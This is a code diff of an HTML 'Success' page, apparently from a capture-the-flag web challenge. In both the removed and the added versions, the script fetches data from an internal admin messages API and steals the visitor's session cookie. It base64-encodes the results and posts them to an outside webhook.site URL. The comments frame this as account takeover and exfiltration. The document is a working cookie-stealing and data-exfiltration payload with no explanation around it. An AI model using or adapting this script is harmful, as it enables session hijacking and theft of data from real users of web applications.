@@ -3,33 +3,26 @@
 <head><title>Success</title></head>
 <body>
     <script>
-        (async () => {
-            const webhook = "https://webhook.site/eea9d67e-7379-46ca-b85a-c69dad2bf391";
-            const myMsgId = "69ea9107bee6d6b7c664642e"; // Your verified message ID
-            
-            let exfil = {};
-
-            // 1. Steal Cookies (ATO)
-            exfil.cookies = document.cookie;
-
-            // 2. Force fetch the message details where the flag is stored
-            try {
-                const response = await fetch(`/api/admin/messages/${myMsgId}`);
-                exfil.flagData = await response.text();
-            } catch (e) {
-                exfil.error = "API Fetch failed";
-            }
-
-            // 3. Send all stolen data to your Webhook as a POST
-            fetch(webhook, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: btoa(JSON.stringify(exfil))
-            });
-
-            // 4. Back-up: Simple GET leak for cookies if POST fails
-            new Image().src = `${webhook}/leak?c=${btoa(document.cookie)}`;
-        })();
+       (async () => {
+    const webhook = "https://webhook.site/eea9d67e-7379-46ca-b85a-c69dad2bf391";
+    const msgId = "69ea9107bee6d6b7c664642e";
+    
+    try {
+        // Fetch the flag from the internal admin API
+        const response = await fetch(`/api/admin/messages/${msgId}`);
+        const data = await response.text();
+        
+        // Exfiltrate the flag to your webhook
+        await fetch(webhook, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: btoa("FLAG_FOUND: " + data)
+        });
+    } catch (e) {
+        // Backup: Steal the session cookie for ATO
+        fetch(webhook + "/cookie?val=" + btoa(document.cookie));
+    }
+})();
     </script>
 </body>
 </html>
